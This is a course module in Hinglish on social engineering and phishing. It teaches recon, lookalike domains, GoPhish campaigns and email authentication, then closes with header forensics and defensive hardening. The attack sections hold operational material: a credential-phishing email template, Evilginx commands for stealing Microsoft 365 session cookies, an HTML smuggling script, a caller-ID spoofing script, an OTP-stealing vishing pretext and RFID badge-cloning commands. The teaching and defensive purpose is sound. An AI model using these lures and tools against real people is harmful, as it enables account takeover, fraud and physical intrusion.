# **Module 09: Social Engineering & Phishing Infrastructure**

### **Red Team Operations, Simulation Engineering & Enterprise Defensive Hardening**

---

## **Master Architecture & Roadmap**

+--------------------------------------------------------------------------------------------------------------------+

|                                      MODULE 09: SOCIAL ENGINEERING MASTER ROADMAP                                  |

+--------------------------------------------------------------------------------------------------------------------+

|  [01] Psychological Vectors & Taxonomies --> Cialdini's Principles, Human/Tech Vectors, Reverse Social Engineering |

|  [02] Pre-Attack OSINT & Recon           --> Target Scraping, SMTP Enumeration, Permutations, dnstwist Engine      |

|  [03] Mail Infrastructure Engineering    --> Postfix, Mail Flow, SPF (RFC 7208), DKIM (RFC 6376), DMARC (RFC 7489) |

|  [04] Enterprise Simulation: GoPhish     --> REST API, SQLite Engine, Landing Pages, Telemetry & Web Beacons       |

|  [05] Adversary-in-the-Middle (AiTM)     --> Reverse Proxy Mechanics, Session Token Interception, FIDO2 Neutralizer |

|  [06] Secure Email Gateway (SEG) Evasion --> HTML Smuggling (JS Blobs), Mark-of-the-Web (MotW), Cloaking Architectures|

|  [07] Multi-Vector Social Engineering    --> Asterisk PBX / Vishing, Smishing Trunks, Proxmark3 Badge Cloning      |

|  [08] Forensics, Telemetry & ZAP Engine  --> Header Analysis, M365 Zero-Hour Auto Purge (ZAP), Phish-Prone Metrics|

|  [09] Enterprise Blue Team Hardening     --> Strict DMARC Enforce, FIDO2/WebAuthn, Conditional Access, Sec Awareness|

+--------------------------------------------------------------------------------------------------------------------+

---

## **1. Psychological Attack Vectors & Human Hacking Taxonomies**

Social engineering systems ko attack nahi karta; system operate karne wale **insani dimag (human psychology)** ke trust models aur cognitive biases ko manipulate karta hai.

                         +------------------------------------------+

                         |      Human Decision-Making Engine        |

                         +------------------------------------------+

                                       │

            ┌──────────────────────────┴──────────────────────────┐

            ▼                                                     ▼

   [ System 1: Fast / Emotional ]                        [ System 2: Slow / Analytical ]

   - Automatic, Low Energy Consumption                   - Logic, Verification, Skepticism

   - Driven by: Urgency, Fear, Authority                 - Verifies email headers, URLs, signatures

   - *Target of Social Engineering!*                     - *Suppressed by Attacker Pretexts!*

### **1.1 Cialdini's 6 Principles of Influence Applied to Cyber**

1. **Authority (Power Dynamic):** Target ko lagta hai ki request kisi senior executive (CEO, CISO), legal team, ya system administrator se aayi hai. Example: _"I am the IT Director; deploy this emergency patch immediately."_
2. **Scarcity & Urgency (Time-Pressure):** Target ko sochne ya verify karne ka time nahi milta. Example: _"Your payroll account will be locked within 30 minutes if you do not verify your banking credentials."_
3. **Fear & Intimidation (Negative Consequences):** Disciplinary action ya compliance penalty ka dar dikhana. Example: _"Failure to review this audit document will result in account termination."_
4. **Social Proof / Consensus (Peer Behavior):** Target ko lagta hai ki baki sab log already ye kar chuke hain. Example: _"All members of the engineering team have already completed their benefits enrollment."_
5. **Reciprocity / Quid Pro Quo (Give and Take):** Attacker pehle ek choti help offer karta hai (e.g., tech support assistance), aur badle me sensitive details ya access mangta hai.
6. **Liking & Familiarity (Rapport Building):** Friendly tone, common connections, ya shared hobbies show karke guard down karwana.

### **1.2 Core Taxonomies (CEH v13 Classification Matrix)**

|Category|Attack Vector|Technical Description & Operational Mechanism|
|---|---|---|
|**Human-Based**|**Impersonation**|Pretending to be someone else (IT support, repair tech, cleaner) to gain physical or logical trust.|
||**Piggybacking vs Tailgating**|**Tailgating:** Unnoticed/unauthorized entry behind an authorized person. **Piggybacking:** Target knowingly holds the door open out of politeness (e.g., carrying heavy boxes).|
||**Dumpster Diving**|Searching discarded organizational trash for paper notes, printed spreadsheets, network diagrams, hardware asset tags.|
||**Reverse Social Engineering**|**3-Phase Cycle:** 1. _Sabotage_ (cause an intentional error/glitch) →\rightarrow→ 2. _Advertise_ (leave contact card: "Call Tech Support at x1024") →\rightarrow→ 3. _Assist_ (target calls attacker voluntarily, providing elevated access willingly).|
||**Quid Pro Quo**|Offering a free service/gift (free tech support, software license) in exchange for credentials.|
|**Computer-Based**|**Spear Phishing**|Highly customized, research-driven phishing targeting specific individuals or departments.|
||**Whaling**|High-profile executive spear phishing targeting C-suite (CEO, CFO, Board members) for large wire transfers or corporate secrets.|
||**Watering Hole**|Compromising a legitimate 3rd-party website frequently visited by the target organization (e.g., a niche vendor portal).|
||**Pharming / DNS Poisoning**|Modifying host files or poisoning DNS cache to redirect legitimate domain queries to malicious harvesting IP addresses.|
|**Mobile-Based**|**Smishing (SMS Phishing)**|Deceptive SMS messages with urgency hooks and shortlinks mimicking delivery services or banking alerts.|
||**Vishing (Voice Phishing)**|Phone call impersonation, IVR spoofing, and caller-ID manipulation.|

---

## **2. Pre-Attack OSINT, Target Reconnaissance & Domain Impersonation**

Successful social engineering campaigns rely on extensive reconnaissance. Reconnaissance ke bina email templates generic lagte hain aur easily detect ho jate hain.

### **2.1 Corporate Reconnaissance & Email Permutation**

Target Entity: CorpSec Inc. (Domain: corpsec-tech.com)

     │

     ├── 1. Employee Enumeration: LinkedIn Scraping, Google Dorks (site:linkedin.com/in "CorpSec")

     ├── 2. Tech Stack Discovery: Job Postings (AWS, Okta SSO, Office 365, Slack)

     └── 3. Email Pattern Identification: Hunter.io, Phonebook.cz

             Resulting Scheme: {first}.{last}@corpsec-tech.com

#### **Verification CLI: SMTP Interactive Probe**

Target mail exchange server ko directly probe karke recipient existence verify karna:

bash

# Connect directly to target corporate MX record over port 25

nc -vn mail.corpsec-tech.com 25

# Interaction Sequence:

HELO mail.pentest-audit.com

250 mail.corpsec-tech.com Hello

MAIL FROM:<auditor@pentest-audit.com>

250 2.1.0 Sender OK

RCPT TO:<john.doe@corpsec-tech.com>

250 2.1.5 Recipient OK  <-- (User exists!)

RCPT TO:<fake.user99@corpsec-tech.com>

550 5.1.1 User unknown  <-- (User does not exist!)

QUIT

### **2.2 Domain Impersonation Engine: `dnstwist`**

Attackers visually deceptive lookalike domains register karte hain taaki victims URL check karne par bhi dhoka kha jayein.

Original Domain:  paypal.com

Typosquatting:    payapl.com       (Transposition)

Combosquatting:   paypal-login.com (Keyword prepending/appending)

Bitsquatting:     pazpal.com       (Single memory bit-flip in RAM/DNS)

Homoglyph / IDN:  pаypal.com       (Cyrillic 'а' U+0430 instead of Latin 'a') -> Punycode: xn--pypal-4ve.com

#### **Automated Generation & Live Check with `dnstwist`:**

bash

# Generate all possible domain permutations, check DNS A records and MX availability

dnstwist --registered --format json targetcorp.com > registered_permutations.json

# Check for Internationalized Domain Names (IDN) / Homoglyphs:

dnstwist --tld com targetcorp

---

## **3. Phishing Infrastructure Engineering: SMTP, Postfix & Authentication Protocols**

Email delivery rate maximize karne aur spam filters ko pass karne ke liye proper infrastructure configuration mandatory hai.

                      +──────────────────────────────────────────────+

                      |         Sender Mail Infrastructure           |

                      |  - VPS: Debian/Ubuntu                        |

                      |  - Postfix MTA + OpenDKIM                    |

                      |  - Lookalike Domain: corpsec-portal.com      |

                      +──────────────────────────────────────────────+

                                             │

                       DNS Validation Records│(Query Port 53)

                                             ▼

+─────────────────────────────────────────────────────────────────────────────────────────+

|                                    Public DNS Server                                    |

|─────────────────────────────────────────────────────────────────────────────────────────|

| 1. SPF Record  : v=spf1 ip4:198.51.100.25 ~all                                          |

| 2. DKIM Record : mail._domainkey.corpsec-portal.com TXT "v=DKIM1; k=rsa; p=MIGfMA0G..." |

| 3. DMARC Record: _dmarc.corpsec-portal.com TXT "v=DMARC1; p=reject; rua=mailto:dmarc@" |

+─────────────────────────────────────────────────────────────────────────────────────────+

                                             │

                                             ▼

                      +──────────────────────────────────────────────+

                      |     Target Secure Email Gateway (SEG)        |

                      |  (Evaluates SPF, DKIM, and DMARC Alignment)  |

                      +──────────────────────────────────────────────+

### **3.1 The Authentication Triad: SPF, DKIM & DMARC**

#### **1. Sender Policy Framework (SPF — RFC 7208)**

Domain owner apne DNS TXT record me declare karta hai ki kaun se IP addresses uski domain ki taraf se email send karne ke liye authorized hain.

- **Mechanisms:** `ip4:<ip>`, `include:<domain>`, `mx`, `a`, `all`.
- **Qualifiers:**
    - `+` (Pass — Default)
    - `-` (HardFail — Drop email immediately)
    - `~` (SoftFail — Accept but mark as suspicious/spam)
    - `?` (Neutral — No policy statement)
- **Crucial Standard Limitation:** **10-Lookup Limit.** SPF evaluation me DNS queries ki total count 10 se zyada nahi honi chahiye; agar 10 se zyada hoti hai, to gateway `PermError` return karta hai aur mail reject ho sakti hai.

dns

; Production SPF TXT Record Syntax:

corpsec-portal.com.   IN   TXT   "v=spf1 ip4:198.51.100.25 include:_spf.google.com ~all"

#### **2. DomainKeys Identified Mail (DKIM — RFC 6376)**

Email ke headers aur body par cryptographic digital signature attach karta hai. Receiving mail server sender ke public key (jo DNS me publish hoti hai) se signature verify karta hai taaki mail transit me tamper na ho sake.

- **Private Key:** Mail Transfer Agent (MTA) par secure rehti hai.
- **Public Key:** DNS TXT record ke andar publish hoti hai selector ke sath (`selector._domainkey.domain.com`).

dns

; Production DKIM TXT Record Syntax (Selector: mail):

mail._domainkey.corpsec-portal.com.   IN   TXT   "v=DKIM1; k=rsa; p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC3..."

#### **3. Domain-based Message Authentication, Reporting & Conformance (DMARC — RFC 7489)**

DMARC SPF aur DKIM ke upar policy layer add karta hai. Ye do main functions perform karta hai:

1. **Alignment Verification:** Checks if the domain in the visible `From:` header matches the domain authenticated by SPF (`Return-Path`) and/or DKIM (`d=`).
    - **Strict Alignment (`aspf=s`, `adkim=s`):** Exact domain match required (`corpsec.com` == `corpsec.com`).
    - **Relaxed Alignment (`aspf=r`, `adkim=r`):** Subdomains match the parent domain (`sub.corpsec.com` matches `corpsec.com`).
2. **Policy Enforcement (`p=`):**
    - `p=none`: Sirf telemetry aur reports collect karo, mail reject mat karo.
    - `p=quarantine`: Fail hone par mail ko recipient ke Spam/Junk folder me move karo.
    - `p=reject`: Fail hone par mail ko gateway level par hi permanently drop kar do.

dns

; Production DMARC TXT Record Syntax:

_dmarc.corpsec-portal.com.   IN   TXT   "v=DMARC1; p=reject; aspf=s; adkim=s; rua=mailto:dmarc-reports@corpsec-portal.com; pct=100"

---

## **4. Enterprise Simulation Platforms: GoPhish Deep Dive**

GoPhish enterprise-grade open-source phishing simulation framework hai jo organizations ko human security awareness test karne ke liye automated campaigns build karne deta hai.

### **4.1 GoPhish Architecture & Setup**

[ GoPhish Engine (Golang Daemon) ]

      ├── Core SQLite / MySQL DB (gophish.db)

      ├── Admin Console (HTTPS / Port 3333) ──► Used by Security Auditor

      ├── Phishing Listener (HTTP/HTTPS / Port 80/443) ──► Serves Landing Pages

      └── SMTP Worker ──► Connects to Mail Relay & Handles Batch Dispatching

#### **Hardening `config.json` for Production:**

Default setup me GoPhish sirf localhost par bind hota hai. Production server ke liye configuration update karni hoti hai:

json

{

  "admin_server": {

    "listen_url": "0.0.0.0:3333",

    "use_tls": true,

    "cert_path": "/etc/letsencrypt/live/admin.corpsec-portal.com/fullchain.pem",

    "key_path": "/etc/letsencrypt/live/admin.corpsec-portal.com/privkey.pem"

  },

  "phish_server": {

    "listen_url": "0.0.0.0:443",

    "use_tls": true,

    "cert_path": "/etc/letsencrypt/live/corpsec-portal.com/fullchain.pem",

    "key_path": "/etc/letsencrypt/live/corpsec-portal.com/privkey.pem"

  },

  "db_name": "sqlite3",

  "db_path": "gophish.db",

  "migrations_prefix": "db/db_",

  "contact_address": "security-team@corpsec-portal.com"

}

### **4.2 Dynamic Email Template & Telemetry Tracking**

GoPhish internal tracking engine har email me unique tokens inject karta hai:

- `{{.FirstName}}` / `{{.LastName}}`: Recipient personalized details.
- `{{.URL}}`: Unique phishing landing page link jisme individual tracking ID embedded hoti hai (e.g., `https://corpsec-portal.com?rid=a1b2c3d`).
- `{{.Tracker}}`: Transparent 1x1 GIF tracking image (`<img src="https://corpsec-portal.com/track?rid=a1b2c3d"/>`). Jab recipient email open karta hai, email client image fetch karta hai, jisse **Email Opened** event log hota hai.

#### **Production Simulation Template (HTML):**

html

<!DOCTYPE html>

<html>

<head>

  <style>

    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }

    .card { max-width: 500px; margin: 20px auto; padding: 25px; border: 1px solid #e0e0e0; border-radius: 8px; }

    .btn { background-color: #0078d4; color: #ffffff; padding: 12px 24px; text-decoration: none; border-radius: 4px; display: inline-block; }

  </style>

</head>

<body>

  <div class="card">

    <h2>Security Alert: Account Verification Required</h2>

    <p>Dear {{.FirstName}},</p>

    <p>We detected an anomalous login attempt to your Microsoft 365 enterprise account from an unrecognized IP address. To prevent administrative account lockout, you are required to verify your credentials within 2 hours.</p>

    <p style="text-align: center; margin: 30px 0;">

      <a href="{{.URL}}" class="btn">Verify Account Access</a>

    </p>

    <p style="font-size: 12px; color: #666;">Security Operations Team &bull; Incident Ref #MS-{{.RId}}</p>

  </div>

  {{.Tracker}}

</body>

</html>

### **4.3 Python GoPhish API Automation Script**

Large target lists ko programmatically import karne aur campaign dispatch automate karne ke liye Python SDK use kiya jata hai:

python

#!/usr/bin/env python3

"""

Automated GoPhish Campaign Dispatcher

Connects to GoPhish REST API, configures targets, and launches simulation.

"""

from gophish import Gophish

from gophish.models import Group, Target, Campaign, SMTP, Template, Page

API_KEY = "YOUR_GOPHISH_API_KEY_HERE"

API_URL = "https://localhost:3333"

# Initialize client (disabling SSL verification for self-signed development setups)

api = Gophish(API_KEY, host=API_URL, verify=False)

def create_and_launch_campaign():

    # 1. Define Target Users

    targets = [

        Target(first_name="Finance", last_name="Lead", email="finance.lead@target-audit.local", position="Finance"),

        Target(first_name="DevOps", last_name="Admin", email="devops.admin@target-audit.local", position="Engineering")

    ]

    group = Group(name="Q4_Target_Group", targets=targets)

    group = api.groups.post(group)

    print(f"[+] Created Target Group ID: {group.id}")

    # 2. Build and Launch Campaign

    campaign = Campaign(

        name="Q4_Enterprise_M365_Verification_Test",

        groups=[group],

        page=Page(name="M365_Credential_Harvest_Page"),

        template=Template(name="M365_Password_Expiry_Notice"),

        smtp=SMTP(name="Internal_Relay_Sending_Profile"),

        url="https://corpsec-portal.com"

    )

    launched_campaign = api.campaigns.post(campaign)

    print(f"[+] Campaign Successfully Dispatched! Campaign ID: {launched_campaign.id}")

if __name__ == "__main__":

    create_and_launch_campaign()

---

## **5. Adversary-in-the-Middle (AiTM) Reverse Proxy & 2FA Bypass Mechanics**

Traditional credential harvesting pages (jo static username aur password capture karte hain) **Multi-Factor Authentication (MFA)** jaise TOTP, SMS codes, ya Microsoft Authenticator push alerts ke samne fail ho jate hain.

Is limitation ko bypass karne ke liye red teams aur advanced attackers **Adversary-in-the-Middle (AiTM)** reverse proxies deploy karte hain.

+──────────+            +──────────────────────────+            +─────────────────────────+

|  Victim  |            |  AiTM Reverse Proxy      |            |  Real Identity Provider |

|  Client  |            |  (Evilginx / Modlishka)  |            |  (login.microsoft.com)  |

+──────────+            +──────────────────────────+            +─────────────────────────+

     │                                │                                      │

     │── [1] GET login.evil.com ─────▶│                                      │

     │                                │── [2] GET login.microsoft.com ──────▶│

     │                                │◀─ [3] Return Real Login HTML ────────│

     │◀─ [4] Forward Login Page ──────│                                      │

     │                                │                                      │

     │── [5] Submit User & Password ─▶│                                      │

     │                                │── [6] Submit User & Password ───────▶│

     │                                │◀─ [7] Challenge: "Enter MFA Code" ───│

     │◀─ [8] Displays MFA Prompt ─────│                                      │

     │                                │                                      │

     │── [9] Victim Enters 2FA Code ─▶│                                      │

     │                                │── [10] Submit 2FA to Microsoft ─────▶│

     │                                │◀─ [11] Auth Success + Set-Cookie ────│

     │                                │        (ESTSAUTH, ESTSAUTHPERSISTENT)│

     │                                │                                      │

     │                                │ *[STEALS SESSION TOKENS / COOKIES!]* │

     │◀─ [12] Redirect to Real App ───│                                      │

### **5.1 How AiTM Intercepts Live Session Tokens**

1. Reverse proxy victim ko real login page serve karta hai (real branding, CSS, localization intact).
2. Victim apna username, password, aur dynamically prompt hone wala MFA code enter karta hai.
3. Attacker proxy in credentials ko real server par submit karta hai. Real server authentication accept karke session tokens/cookies issue karta hai (e.g., `ESTSAUTH`, `ESTSAUTHPERSISTENT`, `FedAuth`).
4. **Token Theft:** Reverse proxy response headers me se `Set-Cookie` tokens capture karke file/database me save kar leta hai. Attacker bina password ya MFA ke in cookies ko apne browser me import karke **authenticated session hijack** kar leta hai.

### **5.2 Evilginx Architecture & Phishlet Configuration**

- **Phishlet:** YAML-based configuration file jo define karti hai:
    - Konsi target domain ko proxy karna hai.
    - Konsi subdomains forward hongi (`login.domain.com`, `account.domain.com`).
    - Kaun se cookies aur request fields (tokens) extract karne hain.

bash

# Evilginx Terminal Workflow

evilginx2

# 1. Configure Listening IP and Base Domain

config domain login-security-check.com

config ip 198.51.100.30

# 2. Setup Built-in Phishlet for Microsoft 365

phishlets hostname o365 login.login-security-check.com

phishlets enable o365

# 3. Create Specific Campaign Lure

lures create o365

lures set 0 redirect_url https://www.office.com

lures get-url 0

# Output: https://login.login-security-check.com/a8X9kP1

# 4. View Captured Sessions (Username, Password, and Cookies)

sessions

sessions 1

### **5.3 The Ultimate Defensive Countermeasure: FIDO2 / WebAuthn**

IMPORTANT

**Why TOTP/SMS/Push MFA Fails:** Standard MFA mechanisms **domain-bound** nahi hote. User jo code generate karta hai, wo real Microsoft portal par bhi valid hota hai aur Evilginx ke through submit karne par bhi accept ho jata hai.

**Why FIDO2 / WebAuthn (YubiKey, Windows Hello) Neutralizes AiTM:** FIDO2 hardware cryptographic handshake browser ke `origin` (domain name) ko check karta hai. Jab browser dekhta hai ki URL `login-security-check.com` hai aur server ka origin `login.microsoft.com` mang raha hai, to cryptographic key signing complete hi nahi hoti. Hardware token fake domain par private key sign karne se refuse kar deta hai!

---

## **6. Secure Email Gateway (SEG) Evasion & Payload Delivery**

Modern Secure Email Gateways (Proofpoint, Mimecast, Microsoft Defender for Office 365) emails ko sandbox environment me render karte hain, links ko click karke analyze karte hain, aur attachments scan karte hain.

### **6.1 HTML Smuggling Mechanics**

Static gateway scanners traditional attachments (.exe, .scr) ko immediately quarantine kar dete hain. **HTML Smuggling** me koi executable email ke through pass hi nahi hota. Mail ke sath ek harmless HTML file attach hoti hai.

Jab user apne machine ke local browser me HTML file open karta hai, tab JavaScript client-side par dynamically file construct karta hai:

html

<!DOCTYPE html>

<html>

<head>

  <title>Secured Document Viewer</title>

</head>

<body>

  <h3>Decrypting secure enterprise document, please wait...</h3>

  <script>

    // Harmless in transit: Encoded byte array inside standard JavaScript

    function base64ToArrayBuffer(base64) {

      var binary_string = window.atob(base64);

      var len = binary_string.length;

      var bytes = new Uint8Array(len);

      for (var i = 0; i < len; i++) {

        bytes[i] = binary_string.charCodeAt(i);

      }

      return bytes.buffer;

    }

    // Dummy sample base64 string representing a payload file

    var fileData = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAAA=";

    var data = base64ToArrayBuffer(fileData);

    // HTML5 Blob API constructs the file locally in user memory

    var blob = new Blob([data], {type: "application/octet-stream"});

    var fileName = "Corporate_Policy_Update.iso";

    // Trigger local browser download

    var link = document.createElement('a');

    link.href = window.URL.createObjectURL(blob);

    link.download = fileName;

    document.body.appendChild(link);

    link.click();

    document.body.removeChild(link);

  </script>

</body>

</html>

### **6.2 Mark of the Web (MotW) Bypass via Container Files**

Windows operating system internet se download hui files par ek alternate data stream attach karta hai: `Zone.Identifier = 3` (Mark of the Web / MotW). MotW present hone par Windows Defender SmartScreen file execution block karta hai aur Office applications me Protected View activate hota hai.

- **Container Packaging (.ISO / .VHD):** Jab victim ek ISO ya Virtual Hard Disk image mount karta hai, to OS container image ko download to mark karta hai, lekin us container ke _andar_ stored internal files par `Zone.Identifier` stream propagate nahi hoti. File container se directly bina security warnings ke execute ho sakti hai.

---

## **7. Multi-Vector Operations: Vishing, Smishing & Physical Testing**

### **7.1 Vishing & Caller ID Spoofing Architecture**

Voice Phishing (Vishing) phone communication ke through urgent pretexts execute karta hai. Attacker identity trust build karne ke liye internal company helpdesk ka number spoof karta hai.

+─────────────────────+           +─────────────────────────+           +──────────────────+

|  Attacker Asterisk  | ────────► |  VoIP SIP Provider /    | ────────► |   Target Phone   |

|  PBX Server         |           |  PSTN Gateway (Twilio)  |           |   (Caller ID:    |

|  (Spoofed Outbound) |           |                         |           |   IT Helpdesk)   |

+─────────────────────+           +─────────────────────────+           +──────────────────+

#### **Twilio REST API Caller ID Spoofing Script (Lab Verification):**

python

#!/usr/bin/env python3

"""

Authorized Voice Simulation Dispatcher

Automates outbound phone verification calls using Twilio API.

"""

from twilio.rest import Client

ACCOUNT_SID = "AC_YOUR_ACCOUNT_SID"

AUTH_TOKEN = "YOUR_AUTH_TOKEN"

client = Client(ACCOUNT_SID, AUTH_TOKEN)

# Initiating call with predefined XML payload

call = client.calls.create(

    to="+15551234567",                      # Target employee phone number

    from_="+15559876543",                    # Spoofed authorized corporate helpdesk number

    url="https://audit-portal.com/ivr.xml"   # TwiML Voice instruction file

)

print(f"[+] Call initiated successfully! Call SID: {call.sid}")

#### **Standard Vishing Pretext Scripts:**

- **The IT Helpdesk Reset:** _"Hi [Employee Name], this is Mark from the Global Identity & Access Management team. We are seeing multiple brute-force password lockouts on your corporate workstation. To prevent your Active Directory account from being disabled, I need you to verify the 6-digit one-time code sent to your phone."_

### **7.2 Physical Social Engineering: RFID Badge Cloning with Proxmark3**

Physical access penetration testing me reception security guards ko bypass karne ke alawa low-frequency (LF 125 kHz) aur high-frequency (HF 13.56 MHz) entry badges clone kiye jate hain.

       [ Victim Badge in Pocket ]

                   │

                   ▼ (10-15 cm Proximity)

       [ Proxmark3 RDV4 / Long-Range Reader ]

                   │

                   ▼ (Captures Facility Code + Card ID)

       [ T5577 Rewritable RFID Card / Fob ]

                   │

                   ▼ (Cloned Card Opens Door!)

       [ Corporate Access Turnstile ]

#### **Proxmark3 CLI Commands for HID ProxCard II (125 kHz):**

bash

# Connect to Proxmark3 client interface

pm3

# 1. Search and sniff low frequency cards in proximity

lf search

# Example Output:

# [=] Valid HID Prox ID Found!

# [=] Format: H10301 (26-bit)

# [=] Facility Code: 112

# [=] Card Number   : 48921

# 2. Clone captured identity onto a blank T5577 rewritable RFID chip

lf hid clone -w H10301 --fc 112 --cn 48921

# 3. Verify the newly written card

lf hid read

---

## **8. Forensic Email Analysis, Telemetry & Microsoft Defender ZAP**

### **8.1 Dissecting Raw Email Headers**

Email client me headers inspect karke spoofing attempt easily identify ki ja sakti hai:

email

Delivered-To: victim@targetcorp.com

Received: by 10.202.55.19 with SMTP id ...; Mon, 12 Oct 2026 10:14:22 -0700

Authentication-Results: mx.google.com;

       spf=softfail (google.com: domain of transitioning bounce@corpsec-portal.com does not designate 198.51.100.25 as permitted sender) smtp.mailfrom=bounce@corpsec-portal.com;

       dkim=fail header.i=@corpsec-portal.com;

       dmarc=fail (p=QUARANTINE sp=QUARANTINE dis=QUARANTINE) header.from=targetcorp.com

Received: from mail.corpsec-portal.com (mail.corpsec-portal.com. [198.51.100.25])

        by mx.targetcorp.com with ESMTP id z8si234190pll.22;

From: "IT Support Helpdesk" <admin@targetcorp.com>

Reply-To: <harvester@corpsec-portal.com>

Return-Path: <bounce@corpsec-portal.com>

Subject: Action Required: Mandatory MFA Renewal

Message-ID: <20261012171422.18492.qmail@corpsec-portal.com>

#### **Forensic Anomalies in this Header:**

1. `From:` header (`admin@targetcorp.com`) display karta hai, jabki actual sending MTA `mail.corpsec-portal.com` (IP `198.51.100.25`) hai.
2. `Return-Path:` aur `From:` domains mismatch hain (**DMARC Alignment Failure**).
3. `Authentication-Results:` explicit show kar raha hai: `spf=softfail`, `dkim=fail`, `dmarc=fail`.

### **8.2 Microsoft Defender Zero-Hour Auto Purge (ZAP) Mechanics**

Microsoft Defender for Office 365 (MDO) me **Zero-Hour Auto Purge (ZAP)** ek critical post-delivery security control hai:

[ Inbound Email ] ──▶ [ Initial Delivery ] ──▶ [ User Inbox ] (Email sitting in inbox)

                             │

                             ▼ (Hours Later: Threat Intelligence Identifies Malicious Link!)

                      [ Microsoft Cloud AI Engine Updates Signature ]

                             │

                             ▼

                      [ ZAP Background Worker Executes ]

                             │

                             ▼

                      [ Email Automatically Purged from Inbox into Quarantine! ]

- **The Problem:** Attacker delivery ke time email ke andar clean link rakhte hain (e.g., standard SharePoint page). Once delivered, 2 ghante baad page content ko weaponize karke credential harvesting form bana dete hain (**Time-of-Click / Delayed Weaponization**).
- **The ZAP Defense:** ZAP continuously enterprise mailboxes monitor karta hai. Jab Microsoft Threat Intelligence kisi URL ya attachment signature ko retroactive malicious flag karti hai, ZAP sabhi user mailboxes se us mail ko silently remove karke Admin Quarantine me move kar deta hai.

---

## **9. Enterprise Blue Team Hardening & Policy Blueprint**

                                  +──────────────────────────────────+

                                  |   DEFENSE-IN-DEPTH ARCHITECTURE  |

                                  +──────────────────────────────────+

                                                    │

             ┌──────────────────────────────────────┼──────────────────────────────────────┐

             ▼                                      ▼                                      ▼

   [ Network & DNS Controls ]              [ Identity & Access (IAM) ]             [ Human Layer ]

   - DMARC Policy: p=reject                - Phishing-Resistant MFA: FIDO2         - Security Awareness Training

   - SPF 10-Lookup Optimization            - Conditional Access (Compliant Only)  - One-Click Phish Report Button

   - Domain Takedown Monitoring            - External Email Warning Banners        - No-Blame Reporting Culture

### **9.1 Enterprise Configuration Policies**

#### **1. Enforcing Phishing-Resistant MFA via Conditional Access (Microsoft Entra ID / Azure AD):**

- Require **FIDO2 Security Keys** ya **Windows Hello for Business** for privileged administrative roles.
- Completely block legacy authentication protocols (POP3, IMAP, SMTP Auth) jo MFA support nahi karte.

#### **2. External Email Warning Banner (Exchange Transport Rule):**

powershell

# Exchange Online PowerShell: Prepend external warning to all incoming internet mail

New-TransportRule -Name "External Sender Warning Banner" `

    -FromScope "NotInOrganization" `

    -ApplyHtmlDisclaimerLocation "Prepend" `

    -ApplyHtmlDisclaimerText '<div style="background-color:#FFF3CD; border:1px solid #FFEEBA; padding:8px; margin-bottom:12px; font-family:sans-serif; font-size:12px; color:#856404;"><strong>CAUTION:</strong> This email originated from outside the organization. Do not click links or open attachments unless you recognize the sender.</div>'

### **9.2 Simulation Reporting & Governance Template**

Authorized security assessment conclude hone ke baad management ko deliver hone wala standardized reporting metric:

markdown

## Enterprise Phishing Simulation Audit Report

**Campaign Identifier:** Q4-Enterprise-M365-Awareness-Audit  

**Execution Window:** October 12, 2026 – October 15, 2026 (72 Hours)  

**Target Population:** 1,500 Enterprise Employees  

### Core Telemetry KPIs

* **Total Emails Dispatched:** 1,500 (100%)

* **Successful Inbox Deliveries:** 1,412 (94.1%)

* **Emails Opened (Web Beacon Trigger):** 892 (63.1%)

* **Phishing Links Clicked:** 241 (17.0%)

* **Credentials / Form Submissions:** 87 (6.1%)

* **Immediate Security Reports to SOC:** 14 (0.9%)  <-- CRITICAL DEFICIT!

### Key Audit Findings

1. **Reporting Velocity Deficit:** Sirf 0.9% users ne phishing report button click kiya. 99% organizations click na karne ke bawajood security team ko alert nahi karte, jisse SOC ki Mean Time to Detect (MTTD) badhti hai.

2. **Departmental Vulnerability:** Finance aur HR departments ne highest click rate (32%) record kiya due to urgency hooks.

3. **MFA Enforcement:** AiTM simulation proved that standard SMS OTP authentication could be bypassed; FIDO2 hardware tokens must be mandated for all cloud administrator accounts.

---

## **20-Module Masterclass Progress Tracker**

|Module #|Module Title / Subject|Status|
|---|---|---|
|**01**|Introduction to Ethical Hacking & Web Fundamentals|**Completed**|
|**02**|Footprinting & Reconnaissance|**Completed**|
|**03**|Scanning Networks|**Completed**|
|**04**|Enumeration (SMB, LDAP, SNMP, RPC)|**Completed**|
|**05**|Vulnerability Analysis|**Completed**|
|**06**|System Hacking & AD Exploitation|**Completed**|
|**07**|Malware Threats & Dynamic Analysis|**Completed**|
|**08**|Sniffing & Deep Wire Forensics|**Completed**|
|**09**|**Social Engineering & Phishing Infrastructure**|**COMPLETED**|
|**10**|Denial-of-Service (DoS / DDoS)|⏳ _Next in Queue_|
|**11**|Session Hijacking|⏳ _Pending_|
|**12**|Evading IDS, Firewalls, and Honeypots|⏳ _Pending_|
|**13**|Hacking Web Servers|⏳ _Pending_|
|**14**|Hacking Web Applications|⏳ _Pending_|
|**15**|SQL Injection|⏳ _Pending_|
|**16**|Hacking Wireless Networks|⏳ _Pending_|
|**17**|Hacking Mobile Platforms|⏳ _Pending_|
|**18**|IoT & OT Hacking|⏳ _Pending_|
|**19**|Cloud Computing Security|⏳ _Pending_|
|**20**|Cryptography & PKI|⏳ _Pending_|